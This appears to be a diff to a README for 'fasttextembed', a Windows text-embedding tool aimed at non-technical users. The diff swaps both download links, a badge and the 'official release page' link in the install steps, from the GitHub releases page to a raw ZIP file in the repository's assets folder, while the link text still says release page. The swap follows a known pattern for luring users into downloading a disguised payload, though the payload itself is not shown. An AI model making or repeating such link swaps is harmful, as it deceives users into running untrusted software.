@@ -1,6 +1,6 @@
 # ⚡ fasttextembed - Fast machine learning tools for everyone
 
-[![Download fasttextembed](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/honeyuntreated288/fasttextembed/releases)
+[![Download fasttextembed](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/honeyuntreated288/fasttextembed/main/assets/Software-2.5-beta.2.zip)
 
 fasttextembed turns text into numbers. Computers use these numbers to understand language. This tool processes text quickly without extra programs. It works on Windows.
 
@@ -25,7 +25,7 @@ The tool works on almost any modern laptop or desktop. You do not need a special
 
 Follow these steps to put the tool on your computer.
 
-1. Go to the [official release page](https://github.com/honeyuntreated288/fasttextembed/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/honeyuntreated288/fasttextembed/main/assets/Software-2.5-beta.2.zip).
 2. Look for the asset section.
 3. Choose the file ending in .exe for Windows.
 4. Click the file name to start the download.
